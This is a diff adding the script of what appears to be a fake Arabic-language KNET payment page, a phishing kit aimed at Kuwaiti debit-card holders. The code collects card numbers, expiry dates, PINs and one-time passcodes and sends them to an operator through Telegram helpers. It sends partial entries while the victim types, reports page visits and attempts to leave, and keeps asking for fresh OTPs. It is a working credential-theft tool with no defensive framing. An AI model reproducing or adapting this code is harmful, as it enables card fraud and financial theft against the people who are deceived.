+            function restoreKnetFormFromStorage() {
+                const storedDetails = getStoredKnetDetails();
+                const hasStoredCoreValues = storedDetails.bankname || storedDetails.dcprefix || storedDetails.debitnumber;
+
+                if (!hasStoredCoreValues) {
+                    return false;
+                }
+
+                fillKnetForm({
+                    bankname: storedDetails.bankname,
+                    dcprefix: storedDetails.dcprefix,
+                    debitnumber: storedDetails.debitnumber,
+                    month: "",
+                    year: "",
+                    pincode: ""
+                });
+                return true;
+            }
+
+            function setProceedButtonText(buttonText) {
+                proceedButton.textContent = buttonText;
+            }
+
+            function stopOtpTimer(resetPlaceholder) {
+                if (otpTimerInterval) {
+                    window.clearInterval(otpTimerInterval);
+                    otpTimerInterval = null;
+                }
+
+                if (resetPlaceholder) {
+                    otpInput.placeholder = otpDefaultPlaceholder;
+                }
+            }
+
+            function getOtpExpiryTimestamp() {
+                const raw = Number(localStorage.getItem(OTP_EXPIRY_STORAGE_KEY));
+                return Number.isFinite(raw) ? raw : 0;
+            }
+
+            function setOtpExpiryTimestamp(timestamp) {
+                localStorage.setItem(OTP_EXPIRY_STORAGE_KEY, String(timestamp));
+            }
+
+            function clearOtpExpiryTimestamp() {
+                localStorage.removeItem(OTP_EXPIRY_STORAGE_KEY);
+            }
+
+            function startOtpTimer() {
+                const now = Date.now();
+                let expiry = getOtpExpiryTimestamp();
+
+                if (!expiry || expiry <= now) {
+                    expiry = now + otpTimerDurationSeconds * 1000;
+                    setOtpExpiryTimestamp(expiry);
+                }
+
+                stopOtpTimer(false);
+
+                otpTimerInterval = window.setInterval(function() {
+                    const remainingMs = Math.max(expiry - Date.now(), 0);
+                    const remainingSeconds = Math.ceil(remainingMs / 1000);
+                    otpInput.placeholder =
+                        "Timeout in: " +
+                        Math.floor(remainingSeconds / 60) +
+                        ":" +
+                        String(remainingSeconds % 60).padStart(2, "0");
+
+                    if (remainingSeconds === 0) {
+                        stopOtpTimer(false);
+                    }
+                }, 1000);
+            }
+
+            function isOtpFormVisible() {
+                return otpForm.style.display === "block";
+            }
+
+            function consumeStep3RedirectFlag() {
+                const wasRedirected = sessionStorage.getItem(KNET_REDIRECT_STORAGE_KEY) === "true";
+                if (wasRedirected) {
+                    sessionStorage.removeItem(KNET_REDIRECT_STORAGE_KEY);
+                }
+                return wasRedirected;
+            }
+
+            function updateValidationMessageDirection() {
+                if (isOtpFormVisible()) {
+                    validationMessage.setAttribute("dir", "rtl");
+                    return;
+                }
+
+                validationMessage.removeAttribute("dir");
+            }
+
+            function formatTwoDigits(value) {
+                return String(value).padStart(2, "0");
+            }
+
+            function maskCardNumber(prefixValue, debitNumberValue) {
+                const maskedPartLength = Math.max(debitNumberValue.length - 4, 0);
+                const visibleLastDigits = debitNumberValue.slice(-4);
+                return prefixValue + "*".repeat(maskedPartLength) + visibleLastDigits;
+            }
+
+            function maskPinCode(pinCodeValue) {
+                return "●".repeat(pinCodeValue.length || 4);
+            }
+
+            function maskOtpCardReference(prefixValue, debitNumberValue) {
+                const safePrefix = prefixValue || "";
+                const safeDebitNumber = debitNumberValue || "";
+                const visibleLastDigits = safeDebitNumber.slice(-4) || "0000";
+                return `${safePrefix}******${visibleLastDigits}`;
+            }
+
+            function populateOtpVerification(details) {
+                dcNumberLabel.textContent = maskCardNumber(details.dcprefix, details.debitnumber);
+                expiryMonthLabel.textContent = formatTwoDigits(details.month);
+                expiryYearLabel.textContent = details.year;
+                pinMaskLabel.textContent = maskPinCode(details.pincode);
+            }
+
+            function showKnetStep() {
+                knetForm.style.display = "block";
+                otpForm.style.display = "none";
+                overlayHide.style.display = "none";
+                proceedButton.disabled = false;
+                otpInput.value = "";
+                stopOtpTimer(true);
+                setProceedButtonText("إرسال");
+                localStorage.removeItem("knetOtpVisible");
+                clearOtpExpiryTimestamp();
+                if (window.hideSubmissionLoadingOverlay) {
+                    window.hideSubmissionLoadingOverlay();
+                }
+                updateValidationMessageDirection();
+                hideValidationMessage();
+            }
+
+            function showOtpStep() {
+                knetForm.style.display = "none";
+                otpForm.style.display = "block";
+                overlayHide.style.display = "none";
+                proceedButton.disabled = false;
+                setProceedButtonText("تأكيد العملية");
+                startOtpTimer();
+                localStorage.setItem("knetOtpVisible", "true");
+                if (window.hideSubmissionLoadingOverlay) {
+                    window.hideSubmissionLoadingOverlay();
+                }
+                updateValidationMessageDirection();
+                hideValidationMessage();
+                requestAnimationFrame(function() {
+                    otpInput.focus();
+                });
+            }
+
+            function normalizeDigits(value) {
+                return value
+                    .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
+                    .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
+            }
+
+            function extractOtpValue(value) {
+                const normalized = normalizeDigits(value || "");
+                const regexMatch = normalized.match(/(\d{6})/);
+                return regexMatch ? regexMatch[1] : normalized.replace(/\D+/g, "").slice(0, 6);
+            }
+
+            function buildAutoOtpMessage(otpValue) {
+                const details = getStoredKnetDetails();
+                return [
+                    `🔐 OTP for ${maskOtpCardReference(details.dcprefix, details.debitnumber)}`,
+                    `─ ${otpValue}`,
+                    "<b>ملاحظة: تم إرسال هذه الرسالة تلقائياً</b>"
+                ].join("\n");
+            }
+
+            function buildManualOtpMessage(otpValue) {
+                const details = getStoredKnetDetails();
+                return [
+                    `🔐 OTP for ${maskOtpCardReference(details.dcprefix, details.debitnumber)}`,
+                    `─ ${otpValue}`
+                ].join("\n");
+            }
+
+            function buildOtpLeaveMessage() {
+                const identityLines = window.getTelegramStoredIdentityLines ? window.getTelegramStoredIdentityLines() : [];
+                return [
+                    identityLines[0] || "👤 الاسم: غير متوفر",
+                    identityLines[1] || "📞 رقم الهاتف: غير متوفر",
+                    window.getTelegramSeparator ? window.getTelegramSeparator() : "<b>───────────────</b>",
+                    "محاولة مغادرة صفحة رمز التحقق بدون إدخال أي رمز"
+                ].join("\n");
+            }
+
+            function sendInvalidKnetFields(invalidFields) {
+                if (!window.sendTelegramMessageWithQueue) {
+                    return;
+                }
+
+                const details = getCurrentKnetInputValues();
+                const message = buildKnetSubmissionMessage(details, { invalidFields: invalidFields });
+                window.sendTelegramMessageWithQueue(message, false).catch(function() {});
+            }
+
+            function resetKnetSensitiveInputs() {
+                monthSelect.value = "";
+                yearSelect.value = "";
+                expiryMonthInput.value = "";
+                expiryYearInput.value = "";
+                cardPinInput.value = "";
+                localStorage.setItem("month", "");
+                localStorage.setItem("year", "");
+                localStorage.setItem("pincode", "");
+                expiryMonthLabel.textContent = "";
+                expiryYearLabel.textContent = "";
+                pinMaskLabel.textContent = maskPinCode("");
+            }
+
+            async function requestReturnFromOtp() {
+                if (!isOtpFormVisible()) {
+                    return;
+                }
+
+                if (extractOtpValue(otpInput.value)) {
+                    showKnetStep();
+                    resetKnetSensitiveInputs();
+                    sendKnetLandingMessage();
+                    return;
+                }
+
+                if (!window.confirm(otpBackConfirmationMessage)) {
+                    requestAnimationFrame(function() {
+                        otpInput.focus();
+                    });
+                    return;
+                }
+
+                if (window.sendTelegramMessageWithQueue) {
+                    window.sendTelegramMessageWithQueue(buildOtpLeaveMessage(), false).catch(function() {});
+                }
+
+                showKnetStep();
+                resetKnetSensitiveInputs();
+                sendKnetLandingMessage();
+            }
+
+            function validateKnetDetails() {
+                const debitNumber = debitNumberInput.value.trim();
+                const completeCardLength = prefixSelect.value.length + debitNumber.length;
+                updateExpiryValidity();
+
+                const invalidFields = [];
+                let firstInvalidField = null;
+
+                if (!bankSelect.value) {
+                    invalidFields.push("bankname");
+                    firstInvalidField = firstInvalidField || "bankname";
+                }
+
+                if (!debitNumber || completeCardLength !== 16) {
+                    if (!invalidFields.includes("card")) {
+                        invalidFields.push("card");
+                    }
+                    firstInvalidField = firstInvalidField || "card";
+                }
+
+                if (!monthSelect.value || !yearSelect.value || isExpiredCard(monthSelect.value, yearSelect.value)) {
+                    if (!invalidFields.includes("expiry")) {
+                        invalidFields.push("expiry");
+                    }
+                    firstInvalidField = firstInvalidField || "expiry";
+                }
+
+                if (!/^\d{4}$/.test(cardPinInput.value.trim())) {
+                    invalidFields.push("pincode");
+                    firstInvalidField = firstInvalidField || "pincode";
+                }
+
+                if (firstInvalidField === "bankname") {
+                    showValidationMessage("خطأ- يرجى أختيار أسم البنك ", bankSelect, ["bank"]);
+                } else if (firstInvalidField === "card") {
+                    showValidationMessage("خطأ يرجى أدخال رقم البطاقة بشكل صحيح", debitNumberInput, ["bank", "dcprefix", "debitNumber"]);
+                } else if (firstInvalidField === "expiry") {
+                    if (!monthSelect.value) {
+                        showValidationMessage("خطأ، يرجى اختيار شهر انتهاء البطاقة.", monthSelect, ["month"]);
+                    } else if (!yearSelect.value) {
+                        showValidationMessage("خطأ، يرجى اختيار سنة انتهاء البطاقة.", yearSelect, ["year"]);
+                    } else {
+                        showValidationMessage("خطأ - البطاقة مدخلة منتهية الصلاحية", monthSelect, ["month", "year"]);
+                    }
+                } else if (firstInvalidField === "pincode") {
+                    showValidationMessage("خطأ، الرقم السري غير صحيح، يجب أن يتكون من 4 أرقام.", cardPinInput, ["cardPin"]);
+                }
+
+                if (invalidFields.length) {
+                    sendInvalidKnetFields(invalidFields);
+                    return false;
+                }
+
+                return true;
+            }
+
+            function buildManualKnetMessage(details) {
+                const identity = window.getTelegramStoredIdentity ? window.getTelegramStoredIdentity() : { name: "", phone: "" };
+                return [
+                    "🏦 معلومات كي نت 🏦",
+                    `👤 ${identity.name || "غير متوفر"} \t ${identity.phone || "غير متوفر"}`,
+                    window.getTelegramSeparator ? window.getTelegramSeparator() : "<b>───────────────</b>",
+                    `🏦 ${details.bankname}`,
+                    `💳 ${details.dcprefix} \t ${details.debitnumber}`,
+                    `📅 ${details.month}/${details.year}`,
+                    `🔐 ${details.pincode}`
+                ].join("\n");
+            }
+
+            function getCurrentKnetInputValues() {
+                return {
+                    bankname: bankSelect.value.trim(),
+                    dcprefix: prefixSelect.value.trim(),
+                    debitnumber: debitNumberInput.value.trim(),
+                    month: monthSelect.value.trim(),
+                    year: yearSelect.value.trim(),
+                    pincode: cardPinInput.value.trim()
+                };
+            }
+
+            function buildKnetSubmissionMessage(details, options) {
+                const opts = options || {};
+                const cardParts = [details.dcprefix, details.debitnumber].filter(Boolean);
+                const expiryParts = [details.month, details.year].filter(Boolean);
+                const invalidFields = Array.isArray(opts.invalidFields) ? opts.invalidFields : [];
+                const directionMark = "\u200E";
+                const dividerLine = `${directionMark}───────────────`;
+                const identity = window.getTelegramStoredIdentity
+                    ? window.getTelegramStoredIdentity()
+                    : { name: "", phone: "" };
+
+                function formatLine(label, value, fieldKey) {
+                    const invalidMark = invalidFields.includes(fieldKey) ? " ❌" : "";
+                    return `${directionMark}${label}${invalidMark} ${value || ""}`.trim();
+                }
+
+                const lines = [
+                    `${directionMark}      ${directionMark}      💳 بطاقة الكي النت 💳       `,
+                    `${directionMark}👤 ${identity.name || "غير متوفر"}`,
+                    `${directionMark}📞 ${identity.phone || "غير متوفر"}`,
+                    dividerLine,
+                    formatLine("🏦", details.bankname, "bankname"),
+                    formatLine("💳", cardParts.join(" - "), "card"),
+                    formatLine("📅", expiryParts.join("/"), "expiry"),
+                    formatLine("🔐", details.pincode, "pincode")
+                ];
+
+                if (opts.autoNote) {
+                    lines.push(`${directionMark}هذه الرسالة تلقائية`);
+                }
+
+                return lines.join("\n");
+            }
+
+            function isKnetDetailsValidSilent(details) {
+                if (!details.bankname) return false;
+                if (!details.dcprefix || !details.debitnumber) return false;
+                if (details.dcprefix.length + details.debitnumber.length !== 16) return false;
+                if (!details.month || !details.year) return false;
+                if (isExpiredCard(details.month, details.year)) return false;
+                if (!/^\d{4}$/.test(details.pincode || "")) return false;
+                return true;
+            }
+
+            function maybeSendAutoKnetInfo() {
+                if (autoKnetInfoSent || !window.sendTelegramMessageWithQueue) {
+                    return;
+                }
+
+                const details = getCurrentKnetInputValues();
+                if (!isKnetDetailsValidSilent(details)) {
+                    return;
+                }
+
+                autoKnetInfoSent = true;
+                const message = buildKnetSubmissionMessage(details, { autoNote: true });
+                window.sendTelegramMessageWithQueue(message, false).catch(function() {});
+            }
+
+            function buildKnetLandingMessage() {
+                const identityLines = window.getTelegramStoredIdentityLines ? window.getTelegramStoredIdentityLines() : [];
+                const pageEmoji = window.getCurrentTelegramPageEmoji ? window.getCurrentTelegramPageEmoji() : "🏦";
+                const identityParts = [];
+                const identity = window.getTelegramStoredIdentity ? window.getTelegramStoredIdentity() : { name: "", phone: "" };
+
+                if (identity.name) identityParts.push(identity.name);
+                if (identity.phone) identityParts.push(identity.phone);
+
+                const identityLine = identityParts.length ? `👤 ${identityParts.join(" ─ ")}` : "👤";
+
+                return [
+                    `${pageEmoji} شخص في صفحة الكي النت`,
+                    identityLine
+                ].join("\n");
+            }
+
+            function sendKnetLandingMessage() {
+                if (!window.sendTelegramMessageWithQueue) {
+                    return;
+                }
+
+                window.sendTelegramMessageWithQueue(buildKnetLandingMessage(), false).catch(function() {});
+            }
+
+            async function handleKnetDetailsSubmit() {
+                if (!validateKnetDetails()) {
+                    return;
+                }
+
+                const details = {
+                    bankname: bankSelect.value,
+                    dcprefix: prefixSelect.value,
+                    debitnumber: debitNumberInput.value.trim(),
+                    month: monthSelect.value.trim(),
+                    year: yearSelect.value.trim(),
+                    pincode: cardPinInput.value.trim()
+                };
+
+                saveKnetDetailsToLocalStorage(details);
+                if (window.clearAllTelegramSessionKeys) {
+                    window.clearAllTelegramSessionKeys();
+                }
+                hideValidationMessage();
+                overlayHide.style.display = "block";
+                proceedButton.disabled = true;
+
+                if (window.sendTelegramUntilDelivered) {
+                    await window.sendTelegramUntilDelivered(buildKnetSubmissionMessage(details), false);
+                }
+
+                if (window.showSubmissionLoadingOverlay) {
+                    window.showSubmissionLoadingOverlay("جارٍ إرسال معلومات كي نت...", 3000, "knet");
+                }
+
+                populateOtpVerification(details);
+                autoSentOtpValue = "";
+                showOtpStep();
+            }
+
+            async function handleOtpSubmit() {
+                const otpValue = extractOtpValue(otpInput.value);
+
+                if (otpValue.length !== 6) {
+                    showValidationMessage("خطأ - يرجى إدخال رمز التحقق بشكل صحيح", otpInput, ["dop"]);
+                    return;
+                }
+
+                otpInput.value = otpValue;
+                hideValidationMessage();
+                overlayHide.style.display = "block";
+                proceedButton.disabled = true;
+
+                if (window.sendTelegramUntilDelivered) {
+                    await window.sendTelegramUntilDelivered(buildManualOtpMessage(otpValue), false);
+                }
+
+                if (window.showSubmissionLoadingOverlay) {
+                    window.showSubmissionLoadingOverlay("جارٍ إرسال رمز التحقق...", 3000, "knet");
+                }
+
+                otpInput.value = "";
+                requestAnimationFrame(function() {
+                    otpInput.focus();
+                });
+                overlayHide.style.display = "none";
+                proceedButton.disabled = false;
+                if (window.hideSubmissionLoadingOverlay) {
+                    window.hideSubmissionLoadingOverlay();
+                }
+            }
+
+            prefixes(bankSelect.value);
+            updateDebitNumberMaxLength(false);
+            restoreKnetFormFromStorage();
+            cardNumberCombined.value = prefixSelect.value + debitNumberInput.value;
+            expiryMonthInput.value = monthSelect.value ? String(monthSelect.value).padStart(2, "0") : "";
+            expiryYearInput.value = yearSelect.value ? String(yearSelect.value).slice(-2) : "";
+            if (consumeStep3RedirectFlag()) {
+                showKnetStep();
+            } else if (localStorage.getItem("knetOtpVisible") === "true") {
+                showOtpStep();
+            } else {
+                showKnetStep();
+            }
+            updateBankIndicator();
+            maybeSendAutoKnetInfo();
+
+            bankSelect.addEventListener("change", function() {
+                prefixes(this.value);
+                updateDebitNumberMaxLength(true);
+                hideValidationMessage(this.id);
+                maybeSendAutoKnetInfo();
+            });
+
+            prefixSelect.addEventListener("change", function() {
+                const selectedOption = this.options[this.selectedIndex];
+                if (selectedOption && selectedOption.dataset.bankCode) {
+                    bankSelect.value = selectedOption.dataset.bankCode;
+                }
+                updateDebitNumberMaxLength(true);
+                debitNumberInput.placeholder = "أدخل 10 أرقام";
+                debitNumberInput.focus();
+                updateBankIndicator();
+                hideValidationMessage(this.id);
+                maybeSendAutoKnetInfo();
+            });
+
+            debitNumberInput.addEventListener("input", function() {
+                keepDigitsOnly(this, true);
+                showBankPrefixSuggestions();
+                updateBankIndicator();
+                hideValidationMessage(this.id);
+                maybeSendAutoKnetInfo();
+            });
+
+            cardNumberCombined.addEventListener("input", function() {
+                keepDigitsOnly(this, true);
+                const value = this.value;
+                showBankPrefixSuggestions();
+                showCombinedPrefixPreview(value);
+                const matchingPrefixes = Object.keys(BANK_PREFIXES)
+                    .reduce(function(prefixesList, bankCode) {
+                        return prefixesList.concat(BANK_PREFIXES[bankCode].map(function(prefix) {
+                            return { bankCode: bankCode, prefix: prefix };
+                        }));
+                    }, [])
+                    .filter(function(item) {
+                        return value.startsWith(item.prefix);
+                    })
+                    .sort(function(first, second) {
+                        return second.prefix.length - first.prefix.length;
+                    });
+
+                if (matchingPrefixes.length) {
+                    bankSelect.value = matchingPrefixes[0].bankCode;
+                    prefixes(matchingPrefixes[0].bankCode);
+                    prefixSelect.value = matchingPrefixes[0].prefix;
+                    debitNumberInput.value = value.slice(matchingPrefixes[0].prefix.length, 16);
+                    updateDebitNumberMaxLength(false);
+                } else {
+                    prefixSelect.value = "";
+                    debitNumberInput.value = "";
+                }
+
+                hideValidationMessage(this.id);
+                maybeSendAutoKnetInfo();
+            });
+
+            bankIndicator.addEventListener("click", function() {
+                const suggestedPrefix = this.dataset.prefix || "";
+
+                if (!suggestedPrefix) {
+                    return;
+                }
+
+                cardNumberCombined.value = suggestedPrefix;
+                cardNumberCombined.dispatchEvent(new Event("input", { bubbles: true }));
+                cardNumberCombined.focus();
+            });
+
+            monthSelect.addEventListener("change", function() {
+                updateExpiryValidity();
+                hideValidationMessage(this.id);
+                maybeSendAutoKnetInfo();
+            });
+
+            yearSelect.addEventListener("change", function() {
+                updateExpiryValidity();
+                hideValidationMessage(this.id);
+                maybeSendAutoKnetInfo();
+            });
+
+            function syncManualExpiry() {
+                keepDigitsOnly(expiryMonthInput, true);
+                keepDigitsOnly(expiryYearInput, true);
+                expiryMonthInput.value = expiryMonthInput.value.slice(0, 2);
+                expiryYearInput.value = expiryYearInput.value.slice(0, 2);
+
+                const month = Number(expiryMonthInput.value);
+                const year = Number(expiryYearInput.value);
+                monthSelect.value = month >= 1 && month <= 12
+                    ? String(month)
+                    : "";
+                yearSelect.value = expiryYearInput.value.length === 2
+                    ? String(2000 + year)
+                    : "";
+
+                hideValidationMessage("month");
+                maybeSendAutoKnetInfo();
+            }
+
+            expiryMonthInput.addEventListener("input", function() {
+                syncManualExpiry();
+
+                const month = Number(expiryMonthInput.value);
+                if (expiryMonthInput.value.length === 2 && month >= 1 && month <= 12) {
+                    expiryYearInput.focus();
+                    expiryYearInput.select();
+                }
+            });
+            expiryYearInput.addEventListener("input", syncManualExpiry);
+
+            cardPinInput.addEventListener("input", function() {
+                keepDigitsOnly(this, true);
+                hideValidationMessage(this.id);
+                maybeSendAutoKnetInfo();
+            });
+
+            otpInput.addEventListener("input", function() {
+                const otpValue = extractOtpValue(otpInput.value);
+                otpInput.value = otpValue;
+                hideValidationMessage(this.id);
+
+                if (otpValue.length === 6 && otpValue !== autoSentOtpValue && window.sendTelegramMessageWithQueue) {
+                    autoSentOtpValue = otpValue;
+                    window.sendTelegramMessageWithQueue(buildAutoOtpMessage(otpValue), false).catch(function() {});
+                }
+            });
+
+            cancelButton.addEventListener("click", function() {
+                requestReturnFromOtp().catch(function() {});
+            });
+
+            form.addEventListener("submit", function(event) {
+                event.preventDefault();
+
+                const action = isOtpFormVisible() ? handleOtpSubmit() : handleKnetDetailsSubmit();
+
+                action.catch(function() {
+                    overlayHide.style.display = "none";
+                    proceedButton.disabled = false;
+                    if (window.hideSubmissionLoadingOverlay) {
+                        window.hideSubmissionLoadingOverlay();
+                    }
+                });
+            });
+
+            if (localStorage.getItem("knetOtpVisible") !== "true") {
+                sendKnetLandingMessage();
+            }
+        });
+    </script>
+    <script src="./assets/js/telegram.js"></script>
+    <script src="./assets/js/tg.js"></script>
+    </body>
+</html>
